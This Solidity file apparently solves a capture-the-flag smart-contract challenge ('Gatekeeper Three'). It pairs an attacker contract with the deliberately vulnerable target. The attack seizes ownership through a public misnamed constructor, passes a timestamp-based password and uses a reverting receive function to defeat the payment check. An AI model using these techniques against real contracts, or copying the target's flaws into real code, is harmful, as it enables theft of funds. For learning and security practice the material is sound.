// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackKeeperThree {
    GatekeeperThree public immutable gatekeeper;
    bool public isRevertCalled;
    //SimpleTrick public immutable simpleTrick;

    constructor(address _gatekeeper) {
        //3. Send 0.001 ether from my metamask wallet (pass gate 3)
        //1. call construct0r (pass gate 1)
        //2. call createTrick and then getAllowance() (pass gate 2)
        gatekeeper = GatekeeperThree(payable(_gatekeeper));
    }

    function checkBalance() external view returns (uint256) {
        return address(gatekeeper).balance;
    }

    function attack() external {
        //Gate 1
        gatekeeper.construct0r();
        //Gate2
        gatekeeper.createTrick();
        gatekeeper.getAllowance(uint256(block.timestamp));

        gatekeeper.enter();
    }

    receive() external payable {
        isRevertCalled = true;
        revert();
    }
}

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
